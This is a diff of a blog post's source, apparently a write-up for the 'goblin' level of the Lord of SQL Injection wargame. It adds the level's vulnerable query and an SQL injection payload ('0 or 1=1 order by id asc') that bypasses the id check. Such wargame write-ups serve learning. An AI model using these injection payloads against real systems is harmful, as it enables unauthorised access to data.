@@ -1,10 +1,18 @@
 ---
 title: "[LOS] goblin"
-date: 2025-03-20 00:00:00
+date: 2025-03-21 00:00:00
 categories: [Wargame, Lord of SQL Injection]
 tags: [webhacking, sqli]
-published: False
+published: True
 ---
+
+# Query
+
+```sql
+select id from prob_goblin where id='guest' and no={$_GET[no]}
+```
+
+<br>
 
 # preg_match
 
@@ -23,5 +31,5 @@ published: False
 # Payload
 
 ```
-
+?no=0 or 1=1 order by id asc
 ```
